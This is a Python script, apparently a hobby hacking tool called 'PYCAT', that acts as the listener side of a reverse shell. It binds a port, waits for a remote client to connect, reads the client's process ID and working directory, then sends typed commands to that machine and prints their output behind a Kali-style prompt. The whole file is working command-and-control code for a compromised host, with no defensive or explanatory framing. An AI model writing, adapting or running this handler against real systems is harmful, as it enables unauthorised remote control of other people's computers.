import os, sys
import platform
import socket
import random

SERVER_HOST = sys.argv[1].split(':')[0]
SERVER_PORT = int(sys.argv[1].split(':')[1])
BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"
BANNER = random.choice(open("D:/Bureau/pycat/banner.txt", "r", encoding="utf8").read().split("<banner-separator>\n"))

def banner_comman(cwd, user=os.getlogin(), OS=platform.system()) -> str:
    return f"\n\033[1m\033[96m┌──(\033[1m\033[94m{user}@{OS}\033[1m\033[96m)-[\033[0m\033[1m{cwd}\033[96m]\n\033[1m\033[96m└─\033[1m\033[94m$\033[0m "

os.system('')
print(BANNER)
print("[\033[34mINFO\033[0m] PYCAT by Game K")
s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)
print(f"[\033[33mWAIT\033[0m] Listening as {SERVER_HOST}:{SERVER_PORT}")
client_socket, client_address = s.accept()
print(f"[\033[32m OK \033[0m] {client_address[0]}:{client_address[1]} Connected")
PID = client_socket.recv(BUFFER_SIZE).decode()
client_socket.send("1".encode("utf-8"))
cwd = client_socket.recv(BUFFER_SIZE).decode()

while True:
    try:
        command = input(banner_comman(cwd))
        if not command.strip():
            continue
        client_socket.send(command.encode("utf-8"))
        if command.lower() == "exit":
            break
        output = client_socket.recv(BUFFER_SIZE).decode("utf8")
        results, cwd = output.split(SEPARATOR)
        print(results)
    except Exception as e:
        print(f"[-] (SERVER) Error shell: {e}")
